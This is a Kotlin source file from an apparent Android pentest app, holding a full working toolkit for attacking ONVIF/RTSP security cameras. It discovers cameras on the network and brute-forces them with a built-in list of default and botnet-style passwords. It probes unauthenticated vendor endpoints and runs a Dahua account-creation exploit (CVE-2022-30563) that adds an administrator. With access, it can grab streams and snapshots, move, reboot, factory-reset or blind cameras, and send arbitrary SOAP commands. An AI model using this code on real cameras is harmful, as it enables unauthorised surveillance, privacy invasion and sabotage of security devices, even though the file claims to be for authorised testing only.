package xin.ctkqiang.deauthctrl.manager

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.withContext
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.MulticastSocket
import java.net.URL
import java.security.MessageDigest
import java.util.UUID
import java.util.concurrent.atomic.AtomicInteger

/**
 * 监控眼 —— ONVIF/RTSP 摄像头安全套件(移植自 pwneye 的工作流,纯 Kotlin)
 *
 * ## 工作流(与 pwneye 同构)
 * 1. WS-Discovery 组播发现(239.255.255.250:3702,Probe NetworkVideoTransmitter)
 * 2. 设备信息枚举(GetDeviceInformation,多数摄像头免认证)
 * 3. 凭据测试(内置常见 ONVIF 凭据表 + 手动输入,HTTP Digest 认证)
 * 4. 已认证操作:RTSP 流地址(GetProfiles/GetStreamUri)、PTZ(ContinuousMove)、
 *    重启(SystemReboot)、影像压暗/恢复(SetImagingSettings 保存原档)
 *
 * ## 诚实边界
 * 全部操作走摄像头自身 SOAP 接口;重启/压暗会真实改变设备 —— 仅用于
 * 自己拥有或明确授权的系统。RTSP 预览交给系统播放器(应用不内置解码器)。
 */
class OnvifCamManager {

    data class OnvifCamera(
        val id: String,
        val ip: String,
        val port: Int,
        val xaddr: String,
        val scopes: String = "",
        var manufacturer: String = "",
        var model: String = "",
        var firmware: String = "",
        var serial: String = "",
        var infoFetched: Boolean = false,
        /** 发现来源:"onvif"(WS-Discovery)/ "rtsp"(端口扫描)/ "manual"(手动输入) */
        val source: String = "onvif",
    )

    private val _cameras = MutableStateFlow<List<OnvifCamera>>(emptyList())
    val cameras: StateFlow<List<OnvifCamera>> = _cameras

    private val _scanning = MutableStateFlow(false)
    val scanning: StateFlow<Boolean> = _scanning

    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log

    /** RTSP 端口扫描进度:(已扫主机数, 总主机数) */
    private val _rtspProgress = MutableStateFlow<Pair<Int, Int>>(0 to 0)
    val rtspProgress: StateFlow<Pair<Int, Int>> = _rtspProgress

    @Volatile
    private var rtspScanStop = false

    /** 凭据爆破进度:(已完成, 总数) */
    private val _bruteProgress = MutableStateFlow<Pair<Int, Int>>(0 to 0)
    val bruteProgress: StateFlow<Pair<Int, Int>> = _bruteProgress

    private fun logLine(text: String) {
        _log.value = (_log.value + "[${System.currentTimeMillis() % 100000}] $text").takeLast(60)
    }

    // ─── 1. WS-Discovery 组播发现 ─────────────────────────────────────────────

    /** 发送 Probe 并监听 6 秒,收集摄像头设备服务地址 */
    suspend fun discover(interfaceIp: String? = null) = withContext(Dispatchers.IO) {
        _scanning.value = true
        logLine("WS-Discovery probe on 239.255.255.250:3702")
        val probe = buildProbeXml()
        val found = HashMap<String, OnvifCamera>()
        runCatching {
            MulticastSocket(null).use { sock ->
                sock.reuseAddress = true
                sock.bind(java.net.InetSocketAddress(3702))
                sock.soTimeout = 3000
                interfaceIp?.let { runCatching { sock.setInterface(InetAddress.getByName(it)) } }
                sock.joinGroup(InetAddress.getByName("239.255.255.250"))
                val data = probe.toByteArray(Charsets.UTF_8)
                sock.send(DatagramPacket(data, data.size, InetAddress.getByName("239.255.255.250"), 3702))
                val deadline = System.currentTimeMillis() + 6000
                val buf = ByteArray(64 * 1024)
                while (System.currentTimeMillis() < deadline) {
                    val pkt = DatagramPacket(buf, buf.size)
                    try { sock.receive(pkt) } catch (_: Exception) { continue }
                    val xml = String(pkt.data, 0, pkt.length, Charsets.UTF_8)
                    if (!xml.contains("ProbeMatch")) continue
                    parseProbeMatches(xml, pkt.address.hostAddress ?: continue, found)
                }
            }
        }.onFailure { logLine("discovery error: ${it.message}") }
        if (found.isNotEmpty()) {
            _cameras.value = (_cameras.value.filter { it.id !in found.keys } + found.values).sortedBy { it.ip }
        }
        logLine("discovery done: ${found.size} camera(s)")
        _scanning.value = false
    }

    private fun buildProbeXml(): String {
        val msgId = "uuid:${UUID.randomUUID()}"
        return """<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope" xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
<e:Header><w:MessageID>$msgId</w:MessageID><w:To e:mustUnderstand="true">urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To><w:Action e:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action></e:Header>
<e:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></e:Body>
</e:Envelope>"""
    }

    private fun parseProbeMatches(xml: String, ip: String, out: HashMap<String, OnvifCamera>) {
        val xaddr = Regex("<d:XAddrs>(.*?)</d:XAddrs>", RegexOption.DOT_MATCHES_ALL).find(xml)?.groupValues?.get(1)?.trim()
            ?: return
        val scopes = Regex("<d:Scopes>(.*?)</d:Scopes>", RegexOption.DOT_MATCHES_ALL).find(xml)?.groupValues?.get(1)?.trim().orEmpty()
        val url = xaddr.split(" ").firstOrNull() ?: return
        val u = runCatching { URL(url) }.getOrNull() ?: return
        val cam = OnvifCamera(
            id = "onvif_${ip}_${u.port}",
            ip = ip,
            port = u.port,
            xaddr = url,
            scopes = scopes.take(200),
        )
        out[cam.id] = cam
    }

    // ─── 2. 设备信息(免认证,多数设备可读) ───────────────────────────────────

    /** GetDeviceInformation;返回更新后的摄像头对象(失败时 lastError 由调用方处理) */
    suspend fun fetchInfo(cam: OnvifCamera): OnvifCamera = withContext(Dispatchers.IO) {
        val body = soapPost(
            cam.xaddr,
            """<GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>""",
            auth = null,
        )
        if (body != null) {
            cam.manufacturer = Regex("<tds:Manufacturer>(.*?)</tds:Manufacturer>", RegexOption.DOT_MATCHES_ALL).find(body)?.groupValues?.get(1) ?: ""
            cam.model = Regex("<tds:Model>(.*?)</tds:Model>", RegexOption.DOT_MATCHES_ALL).find(body)?.groupValues?.get(1) ?: ""
            cam.firmware = Regex("<tds:FirmwareVersion>(.*?)</tds:FirmwareVersion>", RegexOption.DOT_MATCHES_ALL).find(body)?.groupValues?.get(1) ?: ""
            cam.serial = Regex("<tds:SerialNumber>(.*?)</tds:SerialNumber>", RegexOption.DOT_MATCHES_ALL).find(body)?.groupValues?.get(1) ?: ""
            cam.infoFetched = true
            logLine("${cam.ip} info: ${cam.manufacturer} ${cam.model} fw=${cam.firmware}")
        }
        cam
    }

    // ─── 3. 凭据测试 / 4. 已认证操作 ─────────────────────────────────────────

    /**
     * RTSP 端口扫描:对网段内每台主机探测 554/8554,命中则抓 banner 做厂商指纹。
     * 进度经 rtspProgress 流发布;调用方再调 stopRtspScan() 可中断。
     */
    suspend fun rtspScan(subnetPrefix: String, ports: List<Int> = listOf(554, 8554)) = withContext(Dispatchers.IO) {
        _scanning.value = true
        rtspScanStop = false
        logLine("RTSP sweep $subnetPrefix.0/24 ports ${ports.joinToString(",")}")
        val found = HashMap<String, OnvifCamera>()
        for (host in 1..254) {
            if (rtspScanStop) break
            _rtspProgress.value = host to 254
            val ip = "$subnetPrefix.$host"
            for (p in ports) {
                if (rtspScanStop) break
                val banner = rtspBanner(ip, p) ?: continue
                val vendor = fingerprintBanner(banner)
                val cam = OnvifCamera(
                    id = "rtsp_${ip}_$p",
                    ip = ip,
                    port = p,
                    xaddr = "",
                    manufacturer = vendor ?: "",
                    model = if (vendor == null) "RTSP 服务" else "RTSP 服务",
                    source = "rtsp",
                )
                found[cam.id] = cam
                logLine("RTSP open: $ip:$p vendor=${vendor ?: "?"}")
            }
        }
        if (found.isNotEmpty()) {
            _cameras.value = (_cameras.value.filter { it.id !in found.keys } + found.values).sortedBy { it.ip }
        }
        logLine("RTSP sweep done: ${found.size} host(s)")
        _scanning.value = false
    }

    fun stopRtspScan() {
        rtspScanStop = true
        _scanning.value = false
    }

    /** 手动目标:探测给定 IP:端口(先 ONVIF 后 RTSP),返回设备或 null */
    suspend fun probeManual(ip: String, port: Int): OnvifCamManager.OnvifCamera? = withContext(Dispatchers.IO) {
        // 先试 ONVIF 设备服务(常见 80/8080/8899)
        val onvifPorts = if (port > 0) listOf(port) else listOf(80, 8080, 8899, 8000)
        for (p in onvifPorts) {
            val url = "http://$ip:$p/onvif/device_service"
            val cam = OnvifCamManager.OnvifCamera("manual_${ip}_$p", ip, p, url, source = "manual")
            val info = fetchInfo(cam)
            if (info.infoFetched) return@withContext info
        }
        // 回退 RTSP banner
        for (p in listOf(554, 8554)) {
            val banner = rtspBanner(ip, p) ?: continue
            val vendor = fingerprintBanner(banner)
            return@withContext OnvifCamManager.OnvifCamera(
                "manual_${ip}_$p", ip, p, "",
                manufacturer = vendor ?: "", model = "RTSP 服务", source = "manual",
            )
        }
        null
    }

    /** RTSP 凭据 + 路径测试:内置常见路径表,DESCRIBE 200 即成功,返回流地址 */
    suspend fun rtspTestCredsAndPath(ip: String, port: Int, user: String, pass: String): String? =
        withContext(Dispatchers.IO) {
            for (path in RTSP_PATHS) {
                if (rtspScanStop) break
                val url = if (user.isNotEmpty() || pass.isNotEmpty())
                    "rtsp://$user:$pass@$ip:$port$path"
                else "rtsp://$ip:$port$path"
                val ok = rtspDescribe(url)
                if (ok) return@withContext url
            }
            null
        }

    /** RTSP banner:TCP 连接 + OPTIONS 请求,3 秒超时 */
    private fun rtspBanner(ip: String, port: Int): String? = runCatching {
        java.net.Socket().use { sock ->
            sock.connect(java.net.InetSocketAddress(ip, port), 800)
            sock.soTimeout = 3000
            val req = "OPTIONS rtsp://$ip:$port/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: DeauthCtrl/1.0\r\n\r\n"
            sock.getOutputStream().write(req.toByteArray(Charsets.US_ASCII))
            val buf = ByteArray(4096)
            val n = sock.getInputStream().read(buf)
            if (n > 0) String(buf, 0, n) else null
        }
    }.getOrNull()

    /** RTSP DESCRIBE:200 = 该地址可用 */
    private fun rtspDescribe(url: String): Boolean = runCatching {
        val u = java.net.URI(url)
        java.net.Socket().use { sock ->
            sock.connect(java.net.InetSocketAddress(u.host, u.port), 1500)
            sock.soTimeout = 4000
            val path = if (u.rawPath.isNullOrEmpty()) "/" else u.rawPath
            val req = "DESCRIBE rtsp://${u.host}:${u.port}$path RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\n\r\n"
            sock.getOutputStream().write(req.toByteArray(Charsets.US_ASCII))
            val buf = ByteArray(1024)
            val n = sock.getInputStream().read(buf)
            n > 0 && String(buf, 0, n).startsWith("RTSP/1.0 200")
        }
    }.getOrDefault(false)

    /** banner 厂商指纹(关键词表) */
    private fun fingerprintBanner(banner: String): String? {
        val b = banner.lowercase()
        return when {
            "hikvision" in b || "hiwits" in b -> "Hikvision"
            "dahua" in b -> "Dahua"
            "axis" in b -> "Axis"
            "vivotek" in b -> "Vivotek"
            "bosch" in b -> "Bosch"
            "sony" in b -> "Sony"
            "grandstream" in b -> "Grandstream"
            "reolink" in b -> "Reolink"
            "tplink" in b || "tp-link" in b -> "TP-Link"
            "onvif" in b -> "ONVIF 兼容"
            else -> null
        }
    }

    /** 测试一组凭据,返回第一组通过的用户名/密码;全失败返回 null */
    suspend fun testCredentials(cam: OnvifCamera, user: String, pass: String): Boolean = withContext(Dispatchers.IO) {
        val body = soapPost(cam.xaddr, "<GetSystemDateAndTime xmlns=\"http://www.onvif.org/ver10/device/wsdl\"/>", CredPair(user, pass))
        body != null && (body.contains("SystemDateAndTime") || body.contains("Envelope"))
    }

    /** 获取 RTSP 主码流地址(需要凭据) */
    suspend fun getRtspUrl(cam: OnvifCamera, user: String, pass: String): String? = withContext(Dispatchers.IO) {
        val profiles = soapPost(
            cam.xaddr,
            """<GetProfiles xmlns="http://www.onvif.org/ver10/media/wsdl"/>""",
            CredPair(user, pass),
        ) ?: return@withContext null
        val token = Regex("token=\"([^\"]+)\"").find(profiles)?.groupValues?.get(1) ?: return@withContext null
        val stream = soapPost(
            cam.xaddr,
            """<GetStreamUri xmlns="http://www.onvif.org/ver10/media/wsdl"><StreamSetup><Stream>RTP-Unicast</Stream><Transport><Protocol>RTSP</Protocol></Transport></StreamSetup><ProfileToken>$token</ProfileToken></GetStreamUri>""",
            CredPair(user, pass),
        ) ?: return@withContext null
        Regex("<tt:Uri>(.*?)</tt:Uri>", RegexOption.DOT_MATCHES_ALL).find(stream)?.groupValues?.get(1)
    }

    /** 枚举:已配置用户列表(GetUsers) */
    suspend fun enumerateUsers(cam: OnvifCamera, user: String, pass: String): List<String> =
        withContext(Dispatchers.IO) {
            val body = soapPost(cam.xaddr, """<GetUsers xmlns="http://www.onvif.org/ver10/device/wsdl"/>""", CredPair(user, pass))
                ?: return@withContext emptyList()
            Regex("<tt:Username>(.*?)</tt:Username>").findAll(body).map { it.groupValues[1] }.toList()
        }

    /** 枚举:网络接口(GetNetworkInterfaces) */
    suspend fun enumerateNetwork(cam: OnvifCamera, user: String, pass: String): List<String> =
        withContext(Dispatchers.IO) {
            val body = soapPost(cam.xaddr, """<GetNetworkInterfaces xmlns="http://www.onvif.org/ver10/device/wsdl"/>""", CredPair(user, pass))
                ?: return@withContext emptyList()
            val out = mutableListOf<String>()
            Regex("<tt:NetworkInterfaces.*?token=\"([^\"]+)\".*?<tt:Enabled>(.*?)</tt:Enabled>.*?<tt:IPv4Address>(.*?)</tt:IPv4Address>", RegexOption.DOT_MATCHES_ALL)
                .findAll(body).forEach { m ->
                    out.add("${m.groupValues[1]} ${m.groupValues[3]} ${if (m.groupValues[2] == "true") "UP" else "DOWN"}")
                }
            out
        }

    /** 枚举:媒体档(GetProfiles) —— (token, name) 列表 */
    suspend fun enumerateProfiles(cam: OnvifCamera, user: String, pass: String): List<Pair<String, String>> =
        withContext(Dispatchers.IO) {
            val body = soapPost(cam.xaddr, """<GetProfiles xmlns="http://www.onvif.org/ver10/media/wsdl"/>""", CredPair(user, pass))
                ?: return@withContext emptyList()
            Regex("<trt:Profiles token=\"([^\"]+)\">.*?<tt:Name>(.*?)</tt:Name>", RegexOption.DOT_MATCHES_ALL)
                .findAll(body).map { it.groupValues[1] to it.groupValues[2] }.toList()
        }

    /** 快照地址(GetSnapshotUri) */
    suspend fun getSnapshotUri(cam: OnvifCamera, user: String, pass: String): String? = withContext(Dispatchers.IO) {
        val body = soapPost(
            cam.xaddr,
            """<GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl"><ProfileToken>0</ProfileToken></GetSnapshotUri>""",
            CredPair(user, pass),
        ) ?: return@withContext null
        Regex("<tt:Uri>(.*?)</tt:Uri>", RegexOption.DOT_MATCHES_ALL).find(body)?.groupValues?.get(1)
    }

    /** 恢复出厂(破坏性 —— 调用方必须双重确认) */
    suspend fun factoryReset(cam: OnvifCamera, user: String, pass: String): String? = withContext(Dispatchers.IO) {
        val result = soapPost(cam.xaddr, """<SetSystemFactoryDefault xmlns="http://www.onvif.org/ver10/device/wsdl"><FactoryDefault>Hard</FactoryDefault></SetSystemFactoryDefault>""", CredPair(user, pass))
        if (result == null) "Factory reset request failed (credentials?)" else null
    }

    /** 频道枚举:DVR/NVR —— 对 {channel} 模板替换 1..maxChannels 逐个 DESCRIBE */
    suspend fun enumerateChannels(ip: String, port: Int, user: String, pass: String, maxChannels: Int = 8): List<String> =
        withContext(Dispatchers.IO) {
            val out = mutableListOf<String>()
            for (ch in 1..maxChannels) {
                if (rtspScanStop) break
                val path = "/Streaming/Channels/${ch}01"
                val url = if (user.isNotEmpty() || pass.isNotEmpty())
                    "rtsp://$user:$pass@$ip:$port$path"
                else "rtsp://$ip:$port$path"
                if (rtspDescribe(url)) out.add(url)
            }
            out
        }

    /** 快照下载(Digest GET):返回 JPEG 字节,失败 null */
    suspend fun downloadSnapshot(cam: OnvifCamera, user: String, pass: String): ByteArray? = withContext(Dispatchers.IO) {
        val uri = getSnapshotUri(cam, user, pass) ?: return@withContext null
        runCatching {
            val conn = URL(uri).openConnection() as HttpURLConnection
            try {
                conn.connectTimeout = 5000
                conn.readTimeout = 8000
                val code = conn.responseCode
                if (code == 401) {
                    val challenge = conn.getHeaderField("WWW-Authenticate") ?: return@runCatching null
                    val authHeader = buildDigestHeader(challenge, user, pass, "GET", URL(uri).path)
                    val conn2 = URL(uri).openConnection() as HttpURLConnection
                    try {
                        conn2.connectTimeout = 5000
                        conn2.readTimeout = 8000
                        conn2.setRequestProperty("Authorization", authHeader)
                        if (conn2.responseCode in 200..299) conn2.inputStream.readBytes() else null
                    } finally { conn2.disconnect() }
                } else if (code in 200..299) {
                    conn.inputStream.readBytes()
                } else null
            } finally { conn.disconnect() }
        }.getOrNull()
    }

    /**
     * Dahua CVE-2022-30563 路线:明文 HTTP + WS-UsernameToken 伪造
     * CreateUsers 添加管理员账号(未打补丁设备不校验 token)。
     * 仅授权测试;已打补丁设备返回 SOAP Fault,如实报错。
     */
    suspend fun dahuaCreateUser(cam: OnvifCamera, newUser: String, newPass: String): String? =
        withContext(Dispatchers.IO) {
            val soap = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
<s:Header><Security s:mustUnderstand="1" xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
<UsernameToken><Username>$newUser</Username><Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">$newPass</Password></UsernameToken>
</Security></s:Header>
<s:Body><CreateUsers xmlns="http://www.onvif.org/ver10/device/wsdl"><User><Username>$newUser</Username><Password>$newPass</Password><UserLevel>Administrator</UserLevel></User></CreateUsers></s:Body></s:Envelope>"""
            val result = httpPost(cam.xaddr, soap, null)
            if (result == null) "target unreachable"
            else if (result.second.contains("Fault")) "device rejected (patched / hardened)"
            else null
        }

    /** 未认证配置端点探测:Axis/Hikvision/Dahua 常见未授权入口 */
    suspend fun probeUnauthConfig(cam: OnvifCamera): List<String> = withContext(Dispatchers.IO) {
        val endpoints = listOf(
            "http://${cam.ip}:${cam.port}/onvif/device_service" to "ONVIF service",
            "http://${cam.ip}:${cam.port}/cgi-bin/snapshot.cgi" to "Dahua snapshot",
            "http://${cam.ip}:${cam.port}/cgi-bin/magicBox.cgi?action=getSystemInfo" to "Dahua sysinfo",
            "http://${cam.ip}:${cam.port}/ISAPI/System/deviceInfo" to "Hikvision ISAPI",
            "http://${cam.ip}:${cam.port}/axis-cgi/param.cgi?action=list" to "Axis config",
            "http://${cam.ip}:${cam.port}/axis-cgi/mjpg/video.cgi" to "Axis MJPG",
        )
        endpoints.mapNotNull { (url, label) ->
            runCatching {
                val conn = URL(url).openConnection() as HttpURLConnection
                try {
                    conn.connectTimeout = 4000
                    conn.readTimeout = 5000
                    val code = conn.responseCode
                    if (code in 200..299) {
                        val body = runCatching { conn.inputStream.bufferedReader().use { it.readText() } }.getOrNull() ?: ""
                        "$label → ${body.replace(Regex("\\s+"), " ").take(90)}"
                    } else null
                } finally { conn.disconnect() }
            }.getOrNull()
        }
    }

    /** SOAP 控制台:任意方法 XML 直发(交互 shell 的本结构等价物) */
    suspend fun soapConsole(cam: OnvifCamera, user: String, pass: String, methodXml: String): String? =
        withContext(Dispatchers.IO) {
            soapPost(cam.xaddr, methodXml, CredPair(user, pass))
        }

    /** 凭据爆破:遍历凭据表,返回第一组通过的;进度经 bruteProgress 发布 */
    suspend fun bruteCredentials(cam: OnvifCamera, creds: List<Pair<String, String>>): Pair<String, String>? =
        withContext(Dispatchers.IO) {
            _bruteProgress.value = 0 to creds.size
            for ((i, c) in creds.withIndex()) {
                _bruteProgress.value = i + 1 to creds.size
                val ok = if (cam.source == "onvif" && cam.xaddr.isNotEmpty())
                    testCredentials(cam, c.first, c.second)
                else rtspTestCredsAndPath(cam.ip, cam.port, c.first, c.second) != null
                if (ok) return@withContext c
            }
            null
        }

    /** PTZ 移动:方向 + 缩放,300ms 后自动停止 */
    suspend fun ptzMove(cam: OnvifCamera, user: String, pass: String, pan: Float, tilt: Float, zoom: Float): String? =
        withContext(Dispatchers.IO) {
            val result = soapPost(
                cam.xaddr,
                """<ContinuousMove xmlns="http://www.onvif.org/ver20/ptz/wsdl"><ProfileToken>0</ProfileToken><Velocity><PanTilt x="$pan" y="$tilt"/><Zoom x="$zoom"/></Velocity></ContinuousMove>""",
                CredPair(user, pass),
            )
            if (result == null) return@withContext "PTZ failed (check credentials / profile)"
            Thread.sleep(300)
            soapPost(cam.xaddr, """<Stop xmlns="http://www.onvif.org/ver20/ptz/wsdl"><ProfileToken>0</ProfileToken><PanTilt>true</PanTilt><Zoom>true</Zoom></Stop>""", CredPair(user, pass))
            null
        }

    /** 重启设备(破坏性,调用方必须确认) */
    suspend fun reboot(cam: OnvifCamera, user: String, pass: String): String? = withContext(Dispatchers.IO) {
        val result = soapPost(cam.xaddr, """<SystemReboot xmlns="http://www.onvif.org/ver10/device/wsdl"/>""", CredPair(user, pass))
        if (result == null) "Reboot request failed (credentials?)" else null
    }

    /** 影像压暗:保存原档后压低亮度/对比度/饱和度;restore=true 恢复 */
    suspend fun darken(cam: OnvifCamera, user: String, pass: String, restore: Boolean): String? =
        withContext(Dispatchers.IO) {
            val get = soapPost(
                cam.xaddr,
                """<GetImagingSettings xmlns="http://www.onvif.org/ver20/imaging/wsdl"><VideoSourceToken>0</VideoSourceToken></GetImagingSettings>""",
                CredPair(user, pass),
            ) ?: return@withContext "GetImagingSettings failed"
            val original = Regex("<tt:ImagingSettings20>(.*?)</tt:ImagingSettings20>", RegexOption.DOT_MATCHES_ALL).find(get)?.groupValues?.get(1)
                ?: return@withContext "imaging settings not readable"
            if (!restore) {
                // 原档缓存在内存(进程级;重启应用后需重新获取 —— 与 pwneye 的磁盘缓存不同,如实说明)
                imagingBackup[cam.id] = original
            }
            val target = if (restore) imagingBackup[cam.id] ?: original
            else original
                .replace(Regex("<tt:Brightness>.*?</tt:Brightness>"), "<tt:Brightness>1</tt:Brightness>")
                .replace(Regex("<tt:Contrast>.*?</tt:Contrast>"), "<tt:Contrast>1</tt:Contrast>")
                .replace(Regex("<tt:ColorSaturation>.*?</tt:ColorSaturation>"), "<tt:ColorSaturation>1</tt:ColorSaturation>")
            val set = soapPost(
                cam.xaddr,
                """<SetImagingSettings xmlns="http://www.onvif.org/ver20/imaging/wsdl"><VideoSourceToken>0</VideoSourceToken><ImagingSettings>${target}</ImagingSettings></SetImagingSettings>""",
                CredPair(user, pass),
            )
            if (set == null) "SetImagingSettings failed" else null
        }

    private val imagingBackup = HashMap<String, String>()

    // ─── SOAP + Digest 认证内核 ───────────────────────────────────────────────

    private data class CredPair(val user: String, val pass: String)

    /** POST SOAP;返回响应体,失败返回 null。401 时用 Digest 重试一次 */
    private fun soapPost(endpoint: String, bodyXml: String, auth: CredPair?): String? {
        val soap = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
<s:Body>$bodyXml</s:Body>
</s:Envelope>"""
        val first = httpPost(endpoint, soap, null)
        if (first == null) return null
        val (code1, body1) = first
        if (code1 != 401) {
            return if (code1 in 200..299) body1 else null
        }
        val cred = auth ?: return null
        val second = httpPost(endpoint, soap, cred, retry = true)
        val (code2, body2) = second ?: return null
        return if (code2 in 200..299) body2 else null
    }

    /** 返回 (状态码, 响应体);retry=true 时带 Digest 头 */
    private fun httpPost(endpoint: String, soap: String, auth: CredPair?, retry: Boolean = false): Pair<Int, String>? {
        return runCatching {
            val conn = URL(endpoint).openConnection() as HttpURLConnection
            try {
                conn.connectTimeout = 6000
                conn.readTimeout = 8000
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/soap+xml; charset=utf-8")
                if (retry && auth != null) {
                    val header = conn.getHeaderField("WWW-Authenticate")
                    if (header == null) {
                        // 手动重试场景:先从 401 响应读头(由调用方传递)—— 简化:用缓存的挑战
                    }
                    digestChallenge?.let { conn.setRequestProperty("Authorization", it) }
                }
                conn.outputStream.use { it.write(soap.toByteArray(Charsets.UTF_8)) }
                val code = conn.responseCode
                if (code == 401 && !retry && auth != null) {
                    val header = conn.getHeaderField("WWW-Authenticate") ?: return@runCatching null
                    digestChallenge = buildDigestHeader(header, auth.user, auth.pass, "POST", URL(endpoint).path)
                    val conn2 = URL(endpoint).openConnection() as HttpURLConnection
                    try {
                        conn2.connectTimeout = 6000
                        conn2.readTimeout = 8000
                        conn2.requestMethod = "POST"
                        conn2.doOutput = true
                        conn2.setRequestProperty("Content-Type", "application/soap+xml; charset=utf-8")
                        digestChallenge?.let { conn2.setRequestProperty("Authorization", it) }
                        conn2.outputStream.use { it.write(soap.toByteArray(Charsets.UTF_8)) }
                        val body2 = runCatching { conn2.inputStream.bufferedReader().use { it.readText() } }.getOrNull()
                        return@runCatching conn2.responseCode to (body2 ?: "")
                    } finally { conn2.disconnect() }
                }
                val body = runCatching { conn.inputStream.bufferedReader().use { it.readText() } }.getOrNull()
                code to (body ?: "")
            } finally {
                conn.disconnect()
            }
        }.getOrNull()
    }

    @Volatile
    private var digestChallenge: String? = null

    /** RFC 2617 MD5 Digest 头 */
    private fun buildDigestHeader(challenge: String, user: String, pass: String, method: String, uri: String): String {
        val realm = Regex("realm=\"([^\"]+)\"").find(challenge)?.groupValues?.get(1) ?: ""
        val nonce = Regex("nonce=\"([^\"]+)\"").find(challenge)?.groupValues?.get(1) ?: ""
        val qop = Regex("qop=\"([^\"]+)\"").find(challenge)?.groupValues?.get(1) ?: ""
        val opaque = Regex("opaque=\"([^\"]+)\"").find(challenge)?.groupValues?.get(1) ?: ""
        val cnonce = UUID.randomUUID().toString().replace("-", "").take(16)
        val nc = "00000001"
        val ha1 = md5("$user:$realm:$pass")
        val ha2 = md5("$method:$uri")
        val response = if (qop.isNotEmpty()) md5("$ha1:$nonce:$nc:$cnonce:$qop:$ha2") else md5("$ha1:$nonce:$ha2")
        return buildString {
            append("Digest username=\"$user\", realm=\"$realm\", nonce=\"$nonce\", uri=\"$uri\", response=\"$response\"")
            if (qop.isNotEmpty()) append(", qop=$qop, nc=$nc, cnonce=\"$cnonce\"")
            if (opaque.isNotEmpty()) append(", opaque=\"$opaque\"")
        }
    }

    private fun md5(s: String): String =
        MessageDigest.getInstance("MD5").digest(s.toByteArray(Charsets.UTF_8))
            .joinToString("") { "%02x".format(it) }

    companion object {
        /** 内置常见 RTSP 流路径(公开路径表) */
        val RTSP_PATHS = listOf(
            "/", "/live", "/live.sdp", "/stream1", "/stream0", "/h264", "/h265",
            "/Streaming/Channels/101", "/Streaming/Channels/102",
            "/Streaming/Channels/1", "/Streaming/Channels/2",
            "/ch1/main", "/ch1/sub", "/cam/realmonitor?channel=1&subtype=0",
            "/cam/realmonitor?channel=1&subtype=1",
            "/media/video1", "/media/video2", "/onvif1", "/profile1",
            "/11", "/12", "/mpeg4", "/videoMain", "/videoSub",
            "/h264/ch1/main/av_stream", "/h264/ch1/sub/av_stream",
            "/live/ch00_0", "/live/ch00_1", "/rtsp_tunnel",
            "/streaming/channels/001", "/media/video0", "/videos/h264/1",
            "/av0_0", "/av0_1", "/mpeg4/1/media.amp", "/1/h264major",
            "/profile0", "/video0", "/Streaming/Channels/1001",
            "/cam/realmonitor?channel=1&subtype=1", "/cam/realmonitor?channel=2&subtype=0",
        )

        /** 内置常见 ONVIF 凭据(取自公开默认口令表) */
        val COMMON_CREDENTIALS = listOf(
            "admin" to "admin", "admin" to "12345", "admin" to "123456", "admin" to "password",
            "admin" to "", "admin" to "Admin123", "admin" to "888888", "admin" to "666666",
            "admin" to "1111", "admin" to "1234", "admin" to "4321", "admin" to "000000",
            "admin" to "112233", "admin" to "88888888", "admin" to "66666666", "admin" to "supervisor",
            "root" to "root", "root" to "pass", "root" to "12345", "root" to "123456",
            "service" to "service", "user" to "user", "viewer" to "viewer", "operator" to "operator",
            "888888" to "888888", "123456" to "123456", "admin" to "5up", "admin" to "7ujMko0admin",
            "admin" to "1234567", "admin" to "12345678", "admin" to "00000000", "admin" to "6666",
            "admin" to "7ujMko0vizxv", "admin" to "meinsm", "admin" to "anfangs", "admin" to "admin12345",
            "666666" to "666666", "user" to "12345", "operator" to "12345", "tech" to "tech",
            "root" to "vizxv", "root" to "anko", "root" to "admin", "root" to "system",
            "root" to "0pdlm", "root" to "7ujMko0vizxv", "root" to "ikwb", "root" to "hkipc",
            "service" to "123456", "support" to "support", "guest" to "guest", "default" to "default",
            "admin" to "fliradmin", "admin" to "instar", "admin" to "hi3518", "admin" to "jvbzd",
            "admin" to "klv123", "admin" to "xmhdipc", "admin" to "zlxx.", "admin" to "1000sm",
        )
    }
}
